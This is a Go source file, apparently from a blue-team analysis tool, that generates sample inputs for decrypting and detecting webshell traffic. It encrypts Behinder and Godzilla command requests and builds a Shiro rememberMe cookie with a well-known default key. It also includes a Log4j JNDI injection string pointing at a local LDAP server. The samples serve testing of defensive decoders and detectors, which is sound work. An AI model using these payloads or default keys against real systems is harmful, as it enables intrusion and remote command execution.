package btt

import (
	"crypto/aes"
	"crypto/cipher"
	"encoding/base64"
	"encoding/hex"
)

// 以下加密函数与解密实现互为逆运算，用于生成页面"示例"按钮所需的演示密文，
// 保证示例数据一定可以走通解密/检测流程。

func pkcs7Pad(b []byte) []byte {
	pad := aes.BlockSize - len(b)%aes.BlockSize
	for i := 0; i < pad; i++ {
		b = append(b, byte(pad))
	}
	return b
}

// aesECBEncrypt AES-128-ECB 加密（PKCS7 填充）
func aesECBEncrypt(data, key []byte) []byte {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil
	}
	data = pkcs7Pad(data)
	out := make([]byte, len(data))
	for i := 0; i < len(data); i += aes.BlockSize {
		block.Encrypt(out[i:i+aes.BlockSize], data[i:i+aes.BlockSize])
	}
	return out
}

// aesCBCEncrypt AES-CBC 加密（PKCS7 填充）
func aesCBCEncrypt(data, key, iv []byte) []byte {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil
	}
	data = pkcs7Pad(data)
	out := make([]byte, len(data))
	cipher.NewCBCEncrypter(block, iv).CryptBlocks(out, data)
	return out
}

// Samples 返回各蓝队工具的示例输入。
// 密文均由当前实现的加密逆运算现场生成，确保示例解密必然成功。
func Samples() map[string]interface{} {
	// 冰蝎：客户端->服务端请求体，base64(AES-128-ECB(md5hex(pass)[:16]))
	behinderPass := "rebeyond"
	behinderPlain := []byte("POST /shell.jsp HTTP/1.1\n\n{\"action\":\"exec\",\"cmd\":\"whoami\"}")
	behinderData := base64.StdEncoding.EncodeToString(
		aesECBEncrypt(behinderPlain, aesKeyFromPassMD5(behinderPass)))

	// 哥斯拉：base64(AES-128-ECB(md5hex(pass+key)[:16]))，使用常见默认 pass/key
	godzillaPass, godzillaKey := "pass", "key"
	godzillaPlain := []byte("cmd=whoami&path=/var/www/html")
	godzillaData := base64.StdEncoding.EncodeToString(
		aesECBEncrypt(godzillaPlain, aesKeyFromPassKeyMD5(godzillaPass, godzillaKey)))

	// Shiro：base64( iv || AES-CBC(serialized Principals) )，密钥取字典首个默认密钥
	shiroKeyB64 := "kPH+bIxk5D2deZiIxcaaaA=="
	shiroKey, _ := base64.StdEncoding.DecodeString(shiroKeyB64)
	shiroIV := []byte("0123456789abcdef")
	shiroPlain := []byte("\xac\xed\x00\x05sr\x00.org.apache.shiro.subject.SimplePrincipalCollection")
	shiroCookie := base64.StdEncoding.EncodeToString(
		append(shiroIV, aesCBCEncrypt(shiroPlain, shiroKey, shiroIV)...))

	// 冰蝎服务端->客户端方向示例：hex(AES-128-ECB)
	behinderS2CData := hex.EncodeToString(
		aesECBEncrypt([]byte("uid=0(root) gid=0(root) groups=0(root)"), aesKeyFromPassMD5(behinderPass)))

	return map[string]interface{}{
		"behinder": map[string]string{
			"data":      behinderData,
			"pass":      behinderPass,
			"direction": "auto",
		},
		"behinder_s2c": map[string]string{
			"data":      behinderS2CData,
			"pass":      behinderPass,
			"direction": "auto",
		},
		"godzilla": map[string]string{
			"data": godzillaData,
			"pass": godzillaPass,
			"key":  godzillaKey,
			"enc":  "auto",
		},
		"shiro": map[string]string{
			"rememberMe": shiroCookie,
			"key":        "",
			"mode":       "auto",
		},
		"log4j2": map[string]string{
			"payload": "${jndi:ldap://127.0.0.1:1389/Exploit}",
		},
	}
}
